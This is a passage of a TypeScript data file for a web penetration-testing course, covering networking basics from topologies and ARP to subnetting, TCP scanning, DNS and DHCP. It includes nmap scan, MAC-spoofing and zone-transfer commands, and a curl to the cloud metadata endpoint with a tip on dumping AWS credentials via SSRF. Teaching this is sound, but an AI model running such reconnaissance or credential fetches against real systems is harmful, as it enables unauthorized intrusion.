/**
 * Comprehensive Chapter-Wise Deep Curriculum for Web Penetration Testing
 * 10 Chapters, 60+ Lessons, Hands-on Lab Scenarios, Exact Commands & Checklists.
 */

export interface DeepStudyNote {
  heading: string;
  subheading?: string;
  points: string[];
  callout?: string;
  diagramOrCode?: string;
}

export interface RoadmapLesson {
  id: string;
  lessonNumber: string;
  title: string;
  duration: string;
  badge?: string;
  summary: string;
  studyNotes?: DeepStudyNote[];
  keyTopics: string[];
  terminalCommands?: string[];
  proTips?: string[];
}

export interface RoadmapChapter {
  id: string;
  chapterNumber: number;
  title: string;
  subtitle: string;
  badge: string;
  duration: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced" | "Expert";
  description: string;
  iconName: string;
  lessons: RoadmapLesson[];
  handsOnLab: {
    title: string;
    target: string;
    goal: string;
    steps: string[];
    verification: string;
  };
  checklist: { id: string; label: string }[];
}

export const chapterRoadmapList: RoadmapChapter[] = [
  {
    id: "ch-1-networking",
    chapterNumber: 1,
    title: "Computer Networking Mastery: Zero to Advanced",
    subtitle: "From 'What is a Computer Network?' to Packet Forensics, Protocols, Subnetting & Offensive Pivoting",
    badge: "Chapter 1 • Master Foundations",
    duration: "24 Hours • 9 In-Depth Lessons",
    difficulty: "Beginner",
    description:
      "You cannot compromise or defend what you do not understand. This comprehensive study curriculum starts from absolute zero ('What is a computer network?') and walks you step-by-step through network hardware, topologies, packet encapsulation, the OSI & TCP/IP models, binary subnetting, TCP/UDP mechanics, DNS, HTTP/1-2-3, Wireshark forensics, and advanced evasion.",
    iconName: "Globe",
    lessons: [
      {
        id: "l-1-1",
        lessonNumber: "1.1",
        title: "What is a Computer Network? Foundations, Types, Hardware & Topologies",
        duration: "2.5 Hours",
        badge: "Starting Point • Zero",
        summary:
          "The foundational starting point: What is a computer network, why devices connect, transmission media, geographical network classifications (LAN, WAN, MAN), network topologies (Star, Mesh, Bus), and the core hardware (Hubs, Switches, Routers, Firewalls) that makes the Internet function.",
        studyNotes: [
          {
            heading: "Core Network Definition & Fundamental Building Blocks",
            subheading: "What actually happens when two computing devices link together?",
            points: [
              "A Computer Network is defined as two or more computing devices (nodes or hosts) connected via a physical or wireless transmission medium to exchange data, share resources, and communicate protocols.",
              "Node (Host): Any device possessing a network interface card (NIC) capable of sending and receiving data — including laptops, servers, smartphones, IoT sensors, and network switches.",
              "Transmission Media: Guided media includes unshielded twisted pair (UTP Cat6 copper ethernet cables max 100m) and fiber optic cables (using total internal reflection of photons for multi-gigabit inter-datacenter links). Unguided media includes Wi-Fi (802.11 radio frequencies) and cellular links (4G/5G).",
              "Bandwidth vs. Latency: Bandwidth is the volume of data a pipe can transfer per second (e.g. 1 Gbps); Latency is the round-trip propagation delay required for a bit of data to travel from source to destination (measured in milliseconds ms).",
            ],
            callout: "In offensive cyber security, every single device with an IP address is an attack surface. Knowing which physical medium and interface a host uses dictates whether attacks like physical wiretapping, wireless deauthentication, or ARP spoofing are possible.",
            diagramOrCode: `+-------------------------------------------------------------+
|               ANATOMY OF A BASIC COMPUTER NETWORK           |
+-------------------------------------------------------------+
 [ Client PC ]                      [ Web Server ]
       |                                   |
   (Ethernet)                         (Fiber Optic)
       v                                   v
 [ Layer 2 Switch ] <---(Router)---> [ Layer 2 Switch ]
       ^                                   ^
   (Collision                         (Broadcast
    Domain 1)                          Domain 2)`
          },
          {
            heading: "Geographical Network Classification: PAN, LAN, WLAN, MAN & WAN",
            subheading: "How scale dictates architectural design and security trust boundaries",
            points: [
              "PAN (Personal Area Network): Under 10 meters, centered around an individual (Bluetooth headphones, smartwatch pairing). Highly vulnerable to bluebugging and bluesnarfing.",
              "LAN (Local Area Network): High-speed, low-latency private network confined to a single physical location (a home, school lab, or enterprise office building). Typically privately owned with zero ISP billing per packet.",
              "WLAN (Wireless Local Area Network): A LAN using IEEE 802.11 radio waves instead of cables. Protected by WPA2/WPA3 encryption handshakes.",
              "MAN (Metropolitan Area Network): Spans an entire city or university campus (often fiber rings owned by municipalities or consortiums).",
              "WAN (Wide Area Network): Spans countries or the globe. The Internet is the world's largest public WAN — an interconnected web of autonomous systems (AS) exchanging traffic via BGP routers.",
            ],
            callout: "Trust Boundaries: Security controls assume high trust inside a corporate LAN. Once an attacker gains a foothold inside a LAN (via phishing or Wi-Fi penetration), lateral movement is 100x easier because internal firewalls are often non-existent.",
          },
          {
            heading: "Network Topologies: How Nodes Connect",
            subheading: "Comparing Star, Mesh, Bus, and Ring topologies",
            points: [
              "Star Topology: Every node connects to a central hub or switch. If one cable breaks, only that node disconnects. However, the central switch is a Single Point of Failure (SPOF). Modern enterprise networks almost exclusively use Star/Extended Star.",
              "Mesh Topology: Every node has dedicated point-to-point connections to other nodes. Full Mesh formula: N*(N-1)/2 cables. Extremely expensive but provides ultimate redundancy. Used in nuclear facilities, ISP backbones, and military communications.",
              "Bus Topology (Legacy): Single shared coaxial backbone cable terminated at ends. High packet collision rate; any cable cut brings down the entire network. Used half-duplex CSMA/CD.",
              "Ring Topology (Legacy): Tokens circulate in a closed loop (e.g. Token Ring, FDDI). Deterministic latency but vulnerable to single-point loop disruptions.",
            ],
            diagramOrCode: `STAR TOPOLOGY (Modern Standard)       FULL MESH TOPOLOGY (High Redundancy)
          [Server]                                   [A] ------- [B]
             |                                        |  \\     /  |
    [PC 1]---[Switch]---[PC 2]                        |    \\ /    |
             |                                        |    / \\    |
          [PC 3]                                     [C] ------- [D]`
          },
          {
            heading: "Core Hardware Mechanics: Hub vs Switch vs Router vs Firewall",
            subheading: "Understanding the exact role of every device in a rack",
            points: [
              "Hub (Layer 1 - Physical): An unmanaged electronic repeater. When an electrical bit arrives at port 1, it blindly repeats it to all other ports. Has zero intelligence, creates massive collisions, and allows any connected user to sniff all neighbors' cleartext traffic.",
              "Switch (Layer 2 - Data Link): Intelligent hardware. Inspects incoming Ethernet frames for MAC addresses, builds a dynamic Content Addressable Memory (CAM) table, and forwards frames ONLY to the specific destination port.",
              "Router (Layer 3 - Network): Connects entirely different logical networks (subnets). Reads IP packet headers, maintains routing tables, decides optimal packet paths, and acts as the Default Gateway between a private LAN and the public Internet.",
              "Firewall (Layer 3/4/7): Network security gatekeeper. Inspects packets against security rule-sets (Access Control Lists - ACLs), tracks connection states (Stateful Inspection), and drops unauthorized ingress/egress connections.",
            ],
            callout: "Hacker Insight: If you plug Kali Linux into a legacy Hub, you can run Wireshark and see all passwords immediately. On a Switch, you only see your own traffic — UNLESS you execute an ARP Poisoning attack or CAM Table Flooding to force the switch into hub-mode!",
          },
          {
            heading: "Collision Domains vs. Broadcast Domains",
            subheading: "The fundamental rule of network traffic isolation",
            points: [
              "Collision Domain: A network segment where data packets can physically collide with each other when transmitted simultaneously. Every port on a Switch is its own separate collision domain (Full-Duplex eliminates collisions). Hubs place all ports in a single collision domain.",
              "Broadcast Domain: A network area where a broadcast frame (sent to MAC FF:FF:FF:FF:FF:FF or IP 255.255.255.255) is forwarded to every connected node. Switches extend broadcast domains; Routers break and isolate broadcast domains.",
            ],
            diagramOrCode: `HUB:    1 Big Collision Domain   |  1 Big Broadcast Domain
SWITCH: Each Port = 1 Collision |  1 Shared Broadcast Domain
ROUTER: Each Port = 1 Collision |  Breaks Broadcast Domains into Separate Subnets`
          },
        ],
        keyTopics: [
          "Differentiate PAN, LAN, WLAN, MAN, and WAN security boundaries",
          "Understand physical copper UTP vs fiber optic vs wireless transmission media",
          "Analyze Star vs Mesh vs Bus network topologies and Single Points of Failure",
          "Distinguish Hub (L1), Switch (L2), Router (L3), and Firewall (L3/4/7) hardware",
          "Master Collision Domains vs Broadcast Domains and how switches eliminate collisions",
        ],
        terminalCommands: [
          "ip link show",
          "ethtool eth0",
          "nmcli device status",
        ],
        proTips: [
          "When doing an internal physical red team engagement, always look for physical network drops in conference rooms; unmanaged ports often lead straight into the corporate LAN with zero 802.1X network access control!",
        ],
      },
      {
        id: "l-1-2",
        lessonNumber: "1.2",
        title: "How Data Travels: Packets, Frames, MAC Addresses & ARP Protocol",
        duration: "2.5 Hours",
        badge: "Data Link & ARP",
        summary:
          "How data physically travels across local links: The PDU encapsulation pipeline, 48-bit MAC addresses, OUI vendor prefixes, and how the Address Resolution Protocol (ARP) translates IPs to hardware — and why ARP's stateless design enables Man-In-The-Middle (MITM) attacks.",
        studyNotes: [
          {
            heading: "The Encapsulation & Decapsulation PDU Lifecycle",
            subheading: "Protocol Data Units (PDU): From human thought to copper voltage",
            points: [
              "When an application creates data, it travels down the networking stack. At each layer, header information is prepended — this process is called Encapsulation.",
              "Layer 7 (Application): Data (e.g. HTTP GET / HTTP/1.1)",
              "Layer 4 (Transport): Segment (TCP source & destination ports added)",
              "Layer 3 (Network): Packet (Source & destination IP addresses added)",
              "Layer 2 (Data Link): Frame (Source & destination MAC addresses added, plus CRC/FCS checksum trailer)",
              "Layer 1 (Physical): Bits (0s and 1s encoded into electrical voltages, light pulses, or radio waves)",
              "On the receiving computer, Decapsulation strips each header layer-by-layer until pure application data reaches the server process.",
            ],
            diagramOrCode: `[Application Data]                      -> Layer 7 (Data)
[TCP Header] + [Data]                   -> Layer 4 (Segment)
[IP Header] + [TCP] + [Data]            -> Layer 3 (Packet)
[Ethernet Header] + [IP] + [TCP] + [FCS]-> Layer 2 (Frame)
01101001 01101110 01110100             -> Layer 1 (Bits on wire)`
          },
          {
            heading: "MAC Addressing (Media Access Control) Architecture",
            subheading: "The permanent 48-bit physical identifier burned into NIC hardware",
            points: [
              "A MAC address consists of 48 bits (6 bytes), conventionally written in hexadecimal: 00:1A:2B:3C:4D:5E.",
              "OUI (Organizationally Unique Identifier): The first 24 bits (3 bytes) identify the hardware vendor (e.g. Apple, Cisco, Intel, Raspberry Pi) assigned by IEEE.",
              "NIC Specific: The last 24 bits (3 bytes) are uniquely assigned by the manufacturer.",
              "Unicast Address: Targeted to a single physical device.",
              "Multicast Address: Targeted to a group of devices subscribing to a multicast group (starts with 01:00:5E).",
              "Broadcast Address: Sent to all devices on the local segment (FF:FF:FF:FF:FF:FF).",
              "MAC Spoofing: While hardcoded in ROM, the operating system driver loads the MAC into RAM on boot; tools like `macchanger` can change your active MAC address in 1 second to bypass captive portals and MAC filters.",
            ],
          },
          {
            heading: "Address Resolution Protocol (ARP) Deep Dive",
            subheading: "How IP addresses are mapped to physical MAC addresses on a local subnet",
            points: [
              "Computers on a LAN cannot communicate using IP addresses alone; Ethernet frames require destination MAC addresses.",
              "ARP Request (Broadcast): Computer A wants to send data to 192.168.1.100. It broadcasts: 'Who has 192.168.1.100? Tell 192.168.1.50 (MAC A)'. All devices on the switch receive this.",
              "ARP Reply (Unicast): Device with IP 192.168.1.100 replies directly to MAC A: '192.168.1.100 is at 00:11:22:33:44:55'.",
              "ARP Cache: Both machines cache this mapping in their local ARP table (`arp -a`) to avoid broadcasting for every packet.",
            ],
            callout: "The Fatal Security Flaw in ARP: ARP was created in 1982 with ZERO authentication. Any computer can send an unsolicited ARP Reply ('Gratuitous ARP') saying 'I am the default gateway!', and the victim will overwrite its ARP cache immediately without checking if it asked for it!",
            diagramOrCode: `ARP SPOOFING / MAN-IN-THE-MIDDLE (MITM)
[Victim 192.168.1.50]           [Gateway 192.168.1.1]
         \\                         /
          \\                       /
    "192.168.1.1 is at ATTACKER" "192.168.1.50 is at ATTACKER"
            v                   v
              [ ATTACKER MACHINE ]
           (Intercepts & Sniffs All Data)`
          },
        ],
        keyTopics: [
          "Understand the 5-step Encapsulation / Decapsulation lifecycle (Data -> Segment -> Packet -> Frame -> Bits)",
          "Anatomy of 48-bit MAC addresses and vendor identification via IEEE OUI",
          "Differentiate Unicast, Multicast, and Broadcast (FF:FF:FF:FF:FF:FF) transmissions",
          "Analyze ARP Request broadcast and ARP Reply unicast exchange mechanics",
          "Understand the stateless flaw of ARP caching and how ARP Spoofing enables MITM attacks",
        ],
        terminalCommands: [
          "ip neigh show",
          "arp -a",
          "sudo macchanger -s eth0",
          "sudo macchanger -r eth0",
        ],
        proTips: [
          "On modern enterprise Wi-Fi networks with Client Isolation enabled, stations cannot talk directly to each other, which stops basic ARP poisoning. Always verify if client-to-client traffic is permitted before attempting local MITM attacks.",
        ],
      },
      {
        id: "l-1-3",
        lessonNumber: "1.3",
        title: "OSI 7-Layer Model vs TCP/IP Protocol Stack (Layer-by-Layer Attack Surfaces)",
        duration: "3 Hours",
        badge: "Model Architecture",
        summary:
          "The comprehensive blueprint of computer communications: Layer-by-layer exploration of all 7 OSI layers, comparison with the TCP/IP stack, and the specific offensive cyber security attack surfaces targeting each layer.",
        studyNotes: [
          {
            heading: "Why We Need Layered Network Models",
            subheading: "Modularity, protocol independence, and systematic troubleshooting",
            points: [
              "Layering allows software developers and network engineers to develop applications without worrying about physical transmission media (e.g. your browser works identically over Wi-Fi, Ethernet, or 5G).",
              "OSI (Open Systems Interconnection) is a 7-layer theoretical conceptual model designed by ISO.",
              "TCP/IP (Department of Defense DoD Model) is the practical 4-layer (or 5-layer) implementation that powers the actual Internet today.",
            ],
          },
          {
            heading: "The 7 Layers of the OSI Model: Breakdown & Function",
            subheading: "From Physical Layer 1 to Application Layer 7",
            points: [
              "Layer 1 - Physical: Transmits unformatted raw bitstreams over physical media (voltages, light pulses, cables, repeaters, NIC transceivers).",
              "Layer 2 - Data Link: Responsible for node-to-node hop delivery across the local link. Frame framing, MAC addressing, error checking via CRC, flow control. Protocols: Ethernet (IEEE 802.3), Wi-Fi (802.11), PPP, ARP.",
              "Layer 3 - Network: Responsible for end-to-end routing across multiple interconnected networks. Logical IP addressing, packet fragmentation, routing tables. Protocols: IPv4, IPv6, ICMP, IPsec, OSPF, BGP.",
              "Layer 4 - Transport: Responsible for process-to-process data transfer, port multiplexing, and connection reliability. Protocols: TCP (reliable, ordered, connection-oriented) and UDP (unreliable, fast, connectionless).",
              "Layer 5 - Session: Establishes, manages, and terminates dialogues between local and remote applications. Controls simplex, half-duplex, and full-duplex sessions (RPC, NetBIOS, SOCKS).",
              "Layer 6 - Presentation: Translates data between application formats and network formats. Handles character encoding (ASCII, UTF-8), data compression (gzip), and cryptographic encryption/decryption (TLS/SSL).",
              "Layer 7 - Application: Closest to the end user. Interfaces directly with user software applications. Protocols: HTTP, HTTPS, DNS, SSH, FTP, SMTP, IMAP, DHCP.",
            ],
            diagramOrCode: `+-------------------------------------------------------------+
|               OSI 7-LAYER VS TCP/IP PROTOCOL STACK          |
+-------------------------------------------------------------+
   OSI 7-LAYER MODEL               TCP/IP 4-LAYER MODEL
7. Application     \\
6. Presentation     > --------->   Application Layer (HTTP, DNS, SSH)
5. Session         /
4. Transport       ----------->   Transport Layer (TCP, UDP)
3. Network         ----------->   Internet Layer (IP, ICMP, ARP)
2. Data Link       \\
1. Physical         > --------->   Network Access / Link Layer (Ethernet)`
          },
          {
            heading: "Offensive Attack Surfaces at Every Single OSI Layer",
            subheading: "Where vulnerabilities reside across the entire stack",
            points: [
              "Layer 1 Attacks: Cable tapping, Rogue Wi-Fi Access Points (Evil Twin), RF Jamming, Hardware keyloggers, BadUSB.",
              "Layer 2 Attacks: ARP Poisoning, CAM Table Overflow (flooding switch memory with bogus MACs to force it into hub mode), VLAN Hopping, DHCP Starvation.",
              "Layer 3 Attacks: IP Spoofing, ICMP Redirect attacks, Ping of Death, BGP Route Hijacking, Smurf attacks.",
              "Layer 4 Attacks: TCP SYN Flood (resource exhaustion), Port Scanning (SYN, Connect, Xmas), Session Hijacking, TCP Sequence Number Prediction.",
              "Layer 5 Attacks: Session fixation, Token hijacking, RPC exploitation, SMB Relay attacks.",
              "Layer 6 Attacks: TLS Downgrade attacks (POODLE, FREAK), SSL Stripping, Heartbleed (OpenSSL memory leak).",
              "Layer 7 Attacks: SQL Injection, Cross-Site Scripting (XSS), Server-Side Request Forgery (SSRF), Authentication bypass, API flaws, HTTP Request Smuggling.",
            ],
            callout: "Over 80% of modern web bug bounty rewards are earned at Layer 7 (Application Layer). However, without understanding Layers 1–4, an attacker will be blind when firewalls, proxies, rate limits, or packet filters block their exploits!",
          },
        ],
        keyTopics: [
          "Master all 7 layers of OSI (Physical, Data Link, Network, Transport, Session, Presentation, Application)",
          "Map OSI 7-layer concepts to practical TCP/IP 4-layer / 5-layer architecture",
          "Identify specific protocols operating at each layer (HTTP, TCP, IP, Ethernet)",
          "Analyze offensive vulnerabilities and attack surfaces present at every single layer",
          "Understand how security controls (Firewalls, IDS, WAFs) inspect different layers",
        ],
        terminalCommands: [
          "sudo tcpdump -i eth0 -n -c 10",
          "netstat -tulnp",
          "ss -tulpn",
        ],
        proTips: [
          "When an exploit fails, troubleshoot down the OSI stack: Can you ping the IP (Layer 3)? Is the port open (Layer 4)? Is the TLS handshake negotiating (Layer 6)? Is the HTTP payload valid (Layer 7)? This systematic mindset separates amateurs from master penetration testers.",
        ],
      },
      {
        id: "l-1-4",
        lessonNumber: "1.4",
        title: "IP Addressing, Binary Math, Subnetting & CIDR Demystified",
        duration: "3 Hours",
        badge: "IP Math & Routing",
        summary:
          "IPv4 32-bit architecture, binary octets, subnet masks, CIDR prefix notation (/24, /28, /30), calculating usable host ranges, RFC 1918 private scopes, cloud metadata link-local endpoints, and IPv6 essentials.",
        studyNotes: [
          {
            heading: "Anatomy of an IPv4 Address & Binary Octets",
            subheading: "Understanding 32-bit binary addresses behind dotted-decimal notation",
            points: [
              "An IPv4 address consists of 32 bits arranged in 4 groups of 8 bits (called Octets), separated by periods.",
              "Example: 192.168.1.1 in binary is 11000000.10101000.00000001.00000001.",
              "Each 8-bit octet can represent numbers from 0 (00000000) to 255 (11111111). Total theoretical IPv4 address space: 2^32 = 4,294,967,296 addresses.",
              "Every IP address is divided into two logical portions: Network ID (identifies which network you are on) and Host ID (identifies your specific computer on that network). The Subnet Mask determines where the Network portion ends and the Host portion begins.",
            ],
          },
          {
            heading: "Subnet Masks & CIDR (Classless Inter-Domain Routing) Explained",
            subheading: "Why /24, /16, and /8 notation replaced outdated Class A, B, and C networks",
            points: [
              "In binary, a Subnet Mask consists of contiguous 1s for the network bits, followed by contiguous 0s for the host bits.",
              "Subnet Mask 255.255.255.0 = 24 contiguous ones (11111111.11111111.11111111.00000000) -> Written in CIDR slash notation as `/24`.",
              "Formula for Total IP Addresses: 2^(number of host bits 0s). For /24: 2^8 = 256 addresses.",
              "Formula for Usable Host IPs: 2^(host bits) - 2. Why minus 2? Because the FIRST IP is reserved as the Network ID, and the LAST IP is reserved as the Broadcast ID.",
              "Common Subnets: /24 = 254 usable hosts; /28 = 14 usable hosts (often used for small DMZs); /30 = 2 usable hosts (used for point-to-point router links); /16 = 65,534 usable hosts (enterprise campus networks).",
            ],
            diagramOrCode: `+-------------------------------------------------------------+
|                 COMMON CIDR SUBNET CHEAT SHEET              |
+-------------------------------------------------------------+
 CIDR   Subnet Mask        Total IPs   Usable Hosts   Use Case
 /30    255.255.255.252    4           2              Point-to-Point Link
 /29    255.255.255.248    8           6              Small Server Pod
 /28    255.255.255.240    16          14             Isolated DMZ
 /24    255.255.255.0      256         254            Standard Office LAN
 /16    255.255.0.0        65,536      65,534         Large Enterprise HQ`
          },
          {
            heading: "RFC 1918 Private Ranges & Special Reserved IPs",
            subheading: "The non-routable IP spaces that every security researcher must memorize",
            points: [
              "Because IPv4 addresses ran out, RFC 1918 designated 3 blocks of Private IP addresses that routers on the public Internet will never route:",
              "Class A Private: 10.0.0.0 to 10.255.255.255 (/8 prefix, ~16.7 million addresses) — standard in AWS VPCs and massive enterprise networks.",
              "Class B Private: 172.16.0.0 to 172.31.255.255 (/12 prefix, ~1 million addresses) — used heavily in Docker container networks and VPN pools.",
              "Class C Private: 192.168.0.0 to 192.168.255.255 (/16 prefix, 65,536 addresses) — typical home routers and small branch offices.",
              "Loopback Range: 127.0.0.0/8 (commonly 127.0.0.1 - 'localhost'). Stays entirely within the OS networking stack without touching physical wire.",
              "APIPA (Automatic Private IP Addressing): 169.254.0.0/16. Automatically assigned by Windows/macOS when no DHCP server responds.",
              "Cloud Metadata Endpoint: 169.254.169.254. Link-local address used by AWS EC2, GCP, and Azure to provide instance metadata, IAM credentials, and API keys — the premier target in Server-Side Request Forgery (SSRF) exploits!",
            ],
            callout: "When hunting bug bounties, discovering an SSRF vulnerability that can reach http://169.254.169.254/latest/meta-data/iam/security-credentials/ allows you to dump AWS temporary secret keys, yielding Critical ($5,000–$25,000) payouts!",
          },
        ],
        keyTopics: [
          "Convert 32-bit IPv4 addresses between decimal notation and binary octets",
          "Calculate Network Address, Broadcast Address, and Usable Host Range using subnet masks",
          "Memorize CIDR prefix notations: /8, /16, /24, /28, /30",
          "Identify RFC 1918 private ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16",
          "Analyze cloud metadata link-local address 169.254.169.254 in offensive SSRF scenarios",
        ],
        terminalCommands: [
          "ipcalc 192.168.1.50/24",
          "ip route show",
          "curl -s http://169.254.169.254/latest/meta-data/",
        ],
        proTips: [
          "Always check internal IP leakage in HTTP response headers (e.g. `X-Backend-Server: 10.0.4.12` or in error stack traces). Knowing an enterprise's internal IP scheme allows targeted SSRF forging.",
        ],
      },
      {
        id: "l-1-5",
        lessonNumber: "1.5",
        title: "Ports, Sockets & Transport Protocols: TCP vs UDP Deep Dive",
        duration: "3 Hours",
        badge: "Transport Mastery",
        summary:
          "Transport layer mechanics: What is a port and socket, the 3-Way Handshake, TCP state machine, teardown, TCP flags (SYN, ACK, FIN, RST, PSH, URG), Nmap port scanning mechanics (-sS, -sT, -sX), and connectionless UDP amplification attacks.",
        studyNotes: [
          {
            heading: "What is a Port & Socket? The Logical Apartment Analogy",
            subheading: "How an operating system routes packets to the correct application process",
            points: [
              "IP addresses identify the computer (like the street address of an apartment building). Port numbers identify the specific application service running inside that computer (like apartment room numbers).",
              "A Socket is the combination of an IP Address and a Port number, denoted as `IP:Port` (e.g. `192.168.1.50:443`).",
              "Total Port Range: 16-bit field allows ports from 0 to 65,535.",
              "Well-Known Ports (0 – 1023): Reserved for privileged system services (HTTP 80, HTTPS 443, SSH 22, DNS 53, FTP 21, Telnet 23, SMTP 25). Requiring root/admin privileges to bind on Unix.",
              "Registered Ports (1024 – 49151): Assigned by IANA for specific vendor services (MySQL 3306, PostgreSQL 5432, RDP 3389, Redis 6379, MongoDB 27017).",
              "Dynamic / Ephemeral Ports (49152 – 65535): Temporarily assigned by the client OS for outbound connections and released upon session termination.",
            ],
          },
          {
            heading: "TCP (Transmission Control Protocol) Internals & 3-Way Handshake",
            subheading: "Reliable, ordered, error-checked byte stream communication",
            points: [
              "TCP guarantees delivery: packets are tracked by sequence numbers, acknowledged by the receiver, retransmitted if lost, and reassembled in proper order.",
              "The TCP 3-Way Handshake (Connection Establishment):",
              "Step 1: Client -> Server: Sends SYN packet with initial sequence number (ISN) Client_Seq = X. Client enters `SYN_SENT` state.",
              "Step 2: Server -> Client: Server responds with SYN-ACK packet with Server_Seq = Y, and Ack_Seq = X + 1. Server enters `SYN_RECEIVED` state.",
              "Step 3: Client -> Server: Client replies with ACK packet with Ack_Seq = Y + 1. Connection established! Both enter `ESTABLISHED` state.",
              "Connection Teardown (Graceful 4-way close): Host A sends FIN -> Host B sends ACK -> Host B sends FIN -> Host A sends ACK.",
              "Abrupt Teardown: If a packet hits a closed port, or a connection needs immediate aborting, a RST (Reset) packet is sent.",
            ],
            diagramOrCode: `+-------------------------------------------------------------+
|                  THE TCP 3-WAY HANDSHAKE (SYN-ACK)          |
+-------------------------------------------------------------+
   CLIENT                                         SERVER
   [CLOSED]                                      [LISTEN]
      |                                              |
      |  ------ SYN (Seq=X) ---------------------->  | [SYN_RCVD]
      |                                              |
      |  <----- SYN-ACK (Seq=Y, Ack=X+1) ----------  |
      |                                              |
[ESTABLISHED] -- ACK (Ack=Y+1) ------------------->  | [ESTABLISHED]
      |                                              |
      | <====== FULL-DUPLEX ENCRYPTED/PLAIN DATA ===> |`
          },
          {
            heading: "Nmap Port Scanning Mechanics: What the Flags Actually Do",
            subheading: "How offensive scanners abuse TCP state machine anomalies",
            points: [
              "TCP SYN Stealth Scan (`nmap -sS`): Sends SYN. If port is OPEN, server replies SYN-ACK. Nmap immediately sends RST to kill the session BEFORE completing the 3rd handshake step! Why? Because the application server never logs a connection that never finished establishing.",
              "TCP Connect Scan (`nmap -sT`): Completes the full 3-way handshake via the OS `connect()` API. Leaves full log traces in application servers. Used when the attacker has no raw root socket privileges.",
              "Xmas Scan (`nmap -sX`): Sets FIN, PSH, and URG flags ('lit up like a Christmas tree'). Under RFC 793, open ports ignore malformed packets, while closed ports reply with RST. Fails against Windows boxes because Microsoft does not follow RFC 793.",
              "UDP Scanning (`nmap -sU`): Since UDP has no handshake, Nmap sends empty UDP packets. If no response arrives, Nmap flags the port as `open|filtered`. If the port is closed, the target OS sends an ICMP Type 3 Code 3 (Port Unreachable) packet.",
            ],
            callout: "Port scanning is the very first thing an intrusion detection system (IDS/IPS) detects. Using rate limits (`--max-rate 50`), randomized port order, and timing templates (`-T2` or `-T3`) helps avoid triggering automated IP bans.",
          },
        ],
        keyTopics: [
          "Understand Port ranges: Well-Known (0-1023), Registered (1024-49151), and Ephemeral (49152-65535)",
          "Dissect the TCP 3-Way Handshake step-by-step (SYN -> SYN-ACK -> ACK)",
          "Memorize the 6 core TCP Flags: SYN, ACK, FIN, RST, PSH, and URG",
          "Analyze how Nmap SYN Stealth Scanning (-sS) evades application-layer logging",
          "Differentiate UDP connectionless mechanics and why UDP scans are slow due to ICMP rate-limiting",
        ],
        terminalCommands: [
          "sudo nmap -sS -Pn -p 22,80,443,3306,8080 target.com",
          "sudo nmap -sT -p 80 target.com",
          "ss -ant state established",
        ],
        proTips: [
          "Never scan only the top 1000 ports on an enterprise penetration test. Development teams frequently move sensitive admin panels, Jenkins instances, or debug APIs to high ports like 8080, 8443, 8888, 9000, or 27017 to hide from default scans.",
        ],
      },
      {
        id: "l-1-6",
        lessonNumber: "1.6",
        title: "Core Network Services: DNS, DHCP, NAT & Routing Architecture",
        duration: "3 Hours",
        badge: "Network Services",
        summary:
          "The critical services that keep the internet functioning: DNS resolution hierarchy and zone transfers, DHCP DORA allocation and starvation attacks, NAT traversal (SNAT, DNAT, PAT), and Default Gateway routing.",
        studyNotes: [
          {
            heading: "DNS (Domain Name System) Architecture & Resolution Chain",
            subheading: "The global distributed database that translates human names into IP addresses",
            points: [
              "When you type `sub.example.com` into your browser, the resolution chain works recursively:",
              "1. Local Cache: Browser checks its DNS cache, then OS hosts file (`/etc/hosts`).",
              "2. Recursive Resolver: Queries your configured DNS server (e.g. ISP or Google `8.8.8.8`).",
              "3. Root Nameservers: 13 global root IP server clusters (`.` designated A through M) direct the resolver to the TLD nameserver.",
              "4. TLD Nameservers: Responsible for Top-Level Domains (`.com`, `.org`, `.net`, `.in`). Directs resolver to the authoritative nameserver.",
              "5. Authoritative Nameserver: The master server for `example.com` (e.g. Cloudflare, Route 53) that returns the final A record IP address.",
            ],
            diagramOrCode: `+-------------------------------------------------------------+
|                 DNS HIERARCHY RESOLUTION CHAIN              |
+-------------------------------------------------------------+
 [ Client ] ---> [ Recursive Resolver (8.8.8.8) ]
                         |
                 1. Queries Root Nameserver (".")
                         v
                 2. Queries TLD Nameserver (".com")
                         v
                 3. Queries Authoritative Nameserver ("example.com")
                         v
                Returns IP: 93.184.216.34`
          },
          {
            heading: "Critical DNS Record Types & Offensive Reconnaissance",
            subheading: "Mapping an organization's complete digital infrastructure via DNS",
            points: [
              "A Record: Maps hostname to IPv4 address (e.g. `api.target.com -> 104.20.10.5`).",
              "AAAA Record: Maps hostname to 128-bit IPv6 address.",
              "CNAME (Canonical Name): Alias pointing to another domain (e.g. `shop.target.com -> target.myshopify.com`). If the target service is deleted but the CNAME remains, an attacker can register the name and achieve Subdomain Takeover!",
              "MX Record: Mail Exchange servers handling organization email (points to Google Workspace, Microsoft 365, Proofpoint).",
              "TXT Record: Arbitrary text; stores SPF (Sender Policy Framework) and DKIM keys to prevent email spoofing, as well as cloud ownership verification tokens.",
              "NS (Nameserver): Identifies which servers host the authoritative zone for the domain.",
              "AXFR (DNS Zone Transfer): Designed for nameservers to replicate zone files. If misconfigured to allow public queries, an attacker can dump every single internal subdomain, staging server, and private IP in one command!",
            ],
            callout: "Always test `dig axfr target.com @ns1.target.com`. If zone transfer is open, you get the company's entire asset inventory with zero brute-forcing. This is an instant P2/P3 bug bounty finding.",
          },
          {
            heading: "DHCP (Dynamic Host Configuration Protocol) & DORA Process",
            subheading: "Automating network configuration for joining devices",
            points: [
              "The DORA Process:",
              "`D`iscover (Broadcast): New client broadcasts 'I need an IP address!' to 255.255.255.255.",
              "`O`ffer (Unicast/Broadcast): DHCP server offers an available IP lease with subnet mask and lease time.",
              "`R`equest (Broadcast): Client accepts the offer and requests the lease.",
              "`A`cknowledge (Unicast): Server confirms the lease, providing Default Gateway and DNS servers.",
              "DHCP Starvation Attack: An attacker floods the network with thousands of fake MAC addresses requesting IPs until the DHCP pool is completely exhausted, denying service to legitimate machines.",
              "Rogue DHCP Server: Attacker sets up their own rogue DHCP server to respond faster than the real one, handing out the attacker's machine as the Default Gateway and DNS server for total traffic interception.",
            ],
          },
          {
            heading: "NAT (Network Address Translation) & PAT Port Forwarding",
            subheading: "How thousands of private LAN devices share a single public IP",
            points: [
              "Because IPv4 addresses are scarce, routers use NAT to translate private RFC 1918 IPs into a single registered Public IP address when traffic enters the Internet.",
              "SNAT (Source NAT): Rewrites the private source IP of outbound client requests into the router's public IP.",
              "DNAT (Destination NAT / Port Forwarding): Rewrites the public destination IP of inbound packets so traffic on port 80/443 reaches an internal private server.",
              "PAT (Port Address Translation / NAT Overload): Multiplexes thousands of internal devices onto a single public IP by translating both IP addresses AND source port numbers.",
